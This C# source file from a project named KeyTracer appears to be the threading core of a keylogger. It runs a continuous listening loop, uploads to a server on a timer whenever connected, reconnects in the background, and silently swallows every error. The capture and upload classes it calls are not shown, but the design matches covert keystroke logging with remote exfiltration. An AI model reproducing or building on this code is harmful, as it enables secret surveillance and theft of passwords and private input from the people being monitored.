using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

namespace KeyTracer
{
    static class Threads
    {
        public static void UplaodWork()
        {
            try
            {
                while (Consts.doWork)
                {
                    if (Consts.isConnected)
                    {
                        Thread.Sleep(Consts.uploadDelay);
                        Server.Upload();
                    }
                }
            }
            catch
            {
            }
        }

        public static void Reconnect()
        {
            try
            {
                while (Consts.doWork)
                {
                    Thread.Sleep(Consts.serverTimeout);

                    if (Internet.Connect() == 1)
                        Consts.isConnected = true;
                    else
                        Consts.isConnected = false;
                }
            }
            catch
            {
            }
        }

        public static void DoWork()
        {
            try
            {
                while (Consts.doWork)
                {
                    if (!Consts.isUploading)
                        Listener.Listen();
                }
            }
            catch
            {
            }
        }

        public static void AbortThreads(Thread work, Thread uploader, Thread reConnecter)
        {
            try
            {
                work.Abort();
                uploader.Abort();
                reConnecter.Abort();
            }
            catch
            {
            }
        }

        public static void AbortThreads(Thread work, Thread uploader)
        {
            try
            {
                work.Abort();
                uploader.Abort();
            }
            catch
            {
            }
        }
    }
}
